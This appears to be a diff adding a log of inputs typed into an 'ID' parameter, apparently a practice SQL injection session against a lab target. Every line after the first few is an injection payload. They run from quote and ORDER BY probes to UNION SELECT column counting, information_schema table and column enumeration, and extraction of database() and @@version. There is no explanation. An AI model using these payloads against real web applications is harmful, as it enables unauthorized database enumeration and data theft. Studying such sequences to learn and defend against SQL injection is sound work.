@@ -1,0 +1,72 @@
+ID:1
+ID:1
+ID:1
+ID:1
+ID:0
+ID:2
+ID:3
+ID:3'
+ID:1
+ID:1
+ID:1
+ID:2
+ID:2'
+ID:2 UNION SELECT 1,2,3
+ID:2 UNION SELECT 1,2
+ID:2 UNION SELECT 1
+ID:2' UNION SELECT 1,2 /*
+ID:2' UNION SELECT '1,2 
+ID:2' UNION SELECT '1,2,3
+ID:2' UNION SELECT '1,2,3,4
+ID:2' UNION SELECT '1,2,3,4,5
+ID:2' UNION SELECT '1,2,3,4,5,6
+ID:2' UNION SELECT '1,2,3,4,5,6,7
+ID:2' UNION SELECT '1,2
+ID:2' ORDER BY 3 --
+ID:2' ORDER BY 3 /*
+ID:2' ORDER BY 3  --
+ID:2' ORDER BY 3  --
+ID:22' ORDER BY 3; --
+ID:22' ORDER BY 3; --'
+ID:2' ORDER BY 3 ;
+ID:2 UNION SELECT 1,2,3
+ID:2 UNION SELECT 1,2,3,4
+ID:2 UNION SELECT 1,2,3,4,5
+ID:3 UNION SELECT 1,2,3,4,5
+ID:3 UNION SELECT 1
+ID:3' UNION SELECT 1,2,3 --
+ID:3' UNION SELECT 1,2,3 
+ID:3' UNION SELECT 1,2,3 
+ID:3' UNION SELECT 1,2,3 --
+ID:3' UNION SELECT 1,2,3 -- 
+ID:3' UNION SELECT 1,2 -- 
+ID:0' UNION SELECT 1,2,3 -- 
+ID:0' UNION SELECT 1,table_name,3  FROM information_schema.tables-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.tables-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns ORDER BY 1 DESC-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns%2LIMIT 1,2-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name!='ALL_PLUGINS'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%PLUGINS'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%PL%'-- 
+ID:0' UNION SELECT 1,dbname(),3  FROM information_schema.tables-- 
+ID:0' UNION SELECT 1,db(),3  FROM information_schema.tables-- 
+ID:0' UNION SELECT 1,db_name(),3  FROM information_schema.tables-- 
+ID:3' UNION SELECT 1,dbname(),3 -- 
+ID:3' UNION SELECT 1,database(),3 -- 
+ID:0' UNION SELECT 1,database(),3 -- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns where table_name='security'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%PLUGINS'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name like '%security'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%PLUGINS'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%SECURITY '-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name like '%SECURITY '-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name='SECURITY'-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name='SECURITY' -- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name not like '%PLUGI '-- 
+ID:0' UNION SELECT 1,CONCAT(table_name, column_name),3  FROM information_schema.columns WHERE table_name like '%SECU% '-- 
+ID:3' UNION SELECT 1,2,3 -- 
+ID:3' UNION SELECT 1,database(),3 -- 
+ID:0' UNION SELECT 1,database(),3 -- 
+ID:0' UNION SELECT 1,database(),@@version -- 
